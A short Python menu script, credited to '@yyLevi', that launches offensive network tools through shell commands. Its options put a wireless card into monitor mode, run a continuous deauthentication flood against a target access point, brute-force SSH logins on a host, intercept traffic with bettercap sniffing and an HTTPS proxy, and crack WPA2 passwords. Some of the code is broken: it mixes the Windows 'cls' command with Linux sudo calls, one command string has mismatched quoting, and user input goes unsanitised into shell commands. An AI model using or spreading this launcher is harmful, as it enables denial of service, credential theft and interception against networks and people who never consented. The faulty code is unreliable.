import os 

BLACK ="\033[0;30m"#line:7
RED ="\033[0;31m"#line:8
GREEN ="\033[0;32m"#line:9
BROWN ="\033[0;33m"#line:10
BLUE ="\033[0;34m"#line:11
PURPLE ="\033[0;35m"#line:12
CYAN ="\033[0;36m"#line:13
LIGHT_GRAY ="\033[0;37m"#line:14
DARK_GRAY ="\033[1;30m"#line:15
LIGHT_RED ="\033[1;31m"#line:16
LIGHT_GREEN ="\033[1;32m"#line:17
YELLOW ="\033[1;33m"#line:18
LIGHT_BLUE ="\033[1;34m"#line:19
LIGHT_PURPLE ="\033[1;35m"#line:20
LIGHT_CYAN ="\033[1;36m"#line:21
LIGHT_WHITE ="\033[1;37m"#line:22

while True:
 def banner():
  print(f"""{LIGHT_PURPLE}
            _     __                            
 ___ ___ __(_)___/ /__  ___ ____________ ___ ___
/ _ `/ // / / __/  '_/ / _ `/ __/ __/ -_|_-<(_-<
{PURPLE}\_, /\_,_/_/\__/_/\_\  \_,_/\__/\__/\__/___/___/
 /_/                                {LIGHT_WHITE} By @yyLevi\n""")
 
 os.system("cls")
 banner()
 print(f"{LIGHT_GREEN}[1] Enter Monitor Mode & Airodump-ng - Tool airmon-ng")
 print(f"{LIGHT_CYAN}[2] Start Deauth - Tool Aireplay-ng")
 print(f"{YELLOW}[3] {LIGHT_RED}SSH Brute Force,{YELLOW} - Tool Cerbrutus ")
 print(f"{LIGHT_WHITE}[4] Man In The Middle - Tool Bettercap")
 print(f"{LIGHT_PURPLE}[5] {LIGHT_BLUE}Crack {LIGHT_WHITE}Wpa2{LIGHT_BLUE} Passwords ")
 print(f"\n{LIGHT_PURPLE}Remember {LIGHT_WHITE}Ctrl+C{LIGHT_PURPLE} Will Bring You Back, {LIGHT_GREEN}ONLY WHEN IN TOOL SCREEN")
 which = input(f"{LIGHT_RED}Which One:{LIGHT_WHITE} ")
 if which == "1":
  interface = input(f"Enter Your Interface: ")
  start_monitor_mode = f"sudo airmon-ng start {interface}"
  os.system(start_monitor_mode)

  kill_process = "sudo airmon-ng check kill"
  os.system(kill_process)

  auto_airodump = f"sudo airodump-ng {interface}"
  os.system(auto_airodump)
 elif which == "2":
  interface = input(f"Enter Your Interface: ")
  os.system("cls")
  ent_ch = input(f"Enter Your Targets Network Channel: ")
  os.system(f"sudo iwconfig {interface} channel {ent_ch}")
  ap = input(f"Enter The Access Point: ")
  bssid = input(f"Enter The Targets Bssid ")
  os.system(f"sudo aireplay-ng -0 0 -a {ap} -c {bssid} {interface}")
 elif which == "3":
  passwd_list = input(f"Enter Your Password list OR a password: ")
  username = input(f"Enter Your Username list OR a Username: ")
  host_ip = input(f"Enter Host_IP: ")
  threads = input(f"Enter The Amount of Threads")
  os.system(f'"python3 cerbrutus.py {host_ip} SSH -U "{username}" -P {passwd_list} -t {threads}"')
 elif which == "4":
  inf = input(f"Enter Your Interface: ")
  os.system(f"sudo bettercap -iface {inf} -eval 'net.sniff on; https.proxy on; net.probe on'")
 elif which == "5":
  aircrack = input("Enter Your Password List: ")
  pcap = input("Enter Your .Pcap File: ")
  os.system(f"aircrack-ng -w {aircrack} {pcap}")

